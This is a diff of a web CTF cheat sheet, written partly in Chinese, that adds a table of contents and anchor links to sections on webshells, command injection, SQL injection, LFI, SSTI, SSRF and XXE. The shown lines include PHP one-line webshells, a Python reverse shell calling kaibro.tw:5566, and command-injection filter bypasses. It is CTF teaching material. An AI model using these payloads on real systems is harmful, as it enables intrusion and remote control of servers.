@@ -1,6 +1,26 @@
 WEB CTF CheatSheet
 ===
-# Some webshell
+
+Table of Contents
+=================
+
+*  [Webshell](#webshell)
+*  [PHP Tag](#phptag)
+*  [PHP Weak Type](#phpweak)
+*  [PHP Feature](#phpfeature)
+*  [Command Injection](#cmdinj)
+*  [SQL Injection](#sqlinj)
+*  [LFI](#lfi)
+*  [Upload](#upload)
+*  [Serialization](#serial)
+*  [SSTI](#ssti)
+*  [SSRF](#ssrf)
+*  [XXE](#xxe)
+*  [Others](#other)
+*  [Tools and Website](#tool)
+
+
+# [](#webshell) Webshell
 ```php
 <?php system($_GET["cmd"]); ?>
 <?php system($_GET[1]); ?>
@@ -110,7 +130,7 @@ A=fl;B=ag;cat $A$B
     - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
 
-# PHP Tag
+# [](#phptag) PHP Tag
 
 - `<? ?>`
     - short_open_tag 決定是否可使用短標記
@@ -127,7 +147,7 @@ A=fl;B=ag;cat $A$B
 
 
 
-# PHP Weak Type
+# [](#phpweak) PHP Weak Type
 
 - `var_dump('0xABCdef'       == '     0xABCdef');`
     * true           (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)
@@ -163,7 +183,7 @@ A=fl;B=ag;cat $A$B
     - `$a+1` => `1`
 
 
-# PHP 其他特性
+# [](#phpfeature) PHP 其他特性
 
 ## Overflow
 
@@ -290,7 +310,7 @@ A=fl;B=ag;cat $A$B
     - `$a = true and false;`
         - `$a` => `true`
 
-# Command Injection
+# [](#cmdinj) Command Injection
 
 ```
 | cat flag
@@ -340,7 +360,7 @@ cat $(ls)
     - `cat fl''ag`
         - `cat "fl""ag"`
 
-# SQL Injection
+# [](#sqlinj) SQL Injection
 
 
 ## MySQL
@@ -827,7 +847,7 @@ HQL injection example (pwn2win 2017)
                                                                                  
 
 
-# LFI
+# [](#lfi) LFI
 
 ## Testing Payload
 
@@ -913,7 +933,7 @@ HQL injection example (pwn2win 2017)
         ?>
     - 構造 `?file=phar://phartest.zip/b.jpg`
 
-# 上傳漏洞
+# [](#upload) 上傳漏洞
 
 ## Javascript檢測
 
@@ -957,7 +977,7 @@ HQL injection example (pwn2win 2017)
 ## 其他
 - 常見場景：配合文件解析漏洞
 
-# 反序列化
+# [](#serial) 反序列化
 
 ## PHP - Serialize() / Unserialize()
 
@@ -1120,7 +1140,7 @@ print marshalled
 
 在ERB上，當result或run method被call時，@src的string會被執行
 
-# SSTI 
+# [](#ssti) SSTI 
 
 Server-Side Template Injection
 
@@ -1188,7 +1208,7 @@ Server-Side Template Injection
 
 http://blog.portswigger.net/2015/08/server-side-template-injection.html
 
-# SSRF
+# [](#ssrf) SSRF
 
 ## Bypass 127.0.0.1 
 
@@ -1338,7 +1358,7 @@ Testing Payload:
 https://github.com/cujanovic/SSRF-Testing
 
 
-# XXE
+# [](#xxe) XXE
 
 ## 內部實體
 
@@ -1420,7 +1440,7 @@ xxe.dtd:
 - PPTX
 - PDF
 
-# 其它
+# [](#other) 其它
 
  - Information leak
      - .git / .svn
@@ -1494,7 +1514,7 @@ xxe.dtd:
 
 
 
-# Tool & Online Website
+# [](#tool) Tool & Online Website
 
 ## Information gathering
 
